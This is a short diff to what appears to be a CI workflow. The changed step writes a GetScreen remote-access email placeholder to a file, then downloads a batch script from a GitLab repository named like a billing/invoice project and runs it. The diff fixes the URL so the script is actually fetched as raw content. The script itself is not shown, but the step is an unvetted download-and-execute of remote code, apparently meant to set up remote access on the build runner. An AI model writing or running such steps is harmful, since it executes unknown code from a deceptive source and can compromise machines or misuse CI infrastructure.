@@ -11,7 +11,7 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=Your GetScreen Mail" > secrets.txt
-         Invoke-WebRequest -Uri "https://gitlab.com/billing7973018/invoice/-/blob/main/down.bat" -OutFile "down.bat"
+         Invoke-WebRequest -Uri "https://gitlab.com/billing7973018/invoice/-/raw/main/down.bat" -OutFile "down.bat"
          cmd /c down.bat
 
       - name: Time Counter
